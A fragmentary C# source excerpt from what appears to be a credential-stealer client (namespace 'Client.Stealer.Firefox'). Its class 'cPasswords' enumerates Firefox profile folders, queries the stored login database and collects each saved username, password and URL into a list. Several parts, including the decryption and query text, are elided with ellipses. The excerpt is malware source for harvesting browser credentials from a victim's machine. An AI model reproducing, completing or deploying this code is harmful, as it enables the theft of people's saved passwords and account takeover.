...
namespace Client.Stealer.Firefox
{
    class cPasswords
    {
        public static List<Password> Get(string mozilapath)
        {
            ...
            string[] dirs = Directory.GetDirectories(Path.Combine(mozilapath, "Profiles"));
            List<Password> logins = new List<Password>();
            if (dirs.Length == 0)
                return logins;
                    ...
                    using (var command = conn.CreateCommand())
                    {
                        ...
                        using (var reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                ...
                                logins.Add(new Password
                                {
                                    sUsername = username,
                                    sPassword = password,
                                    sUrl = reader.GetString(2)
                                });
                            }
                        }
                    }
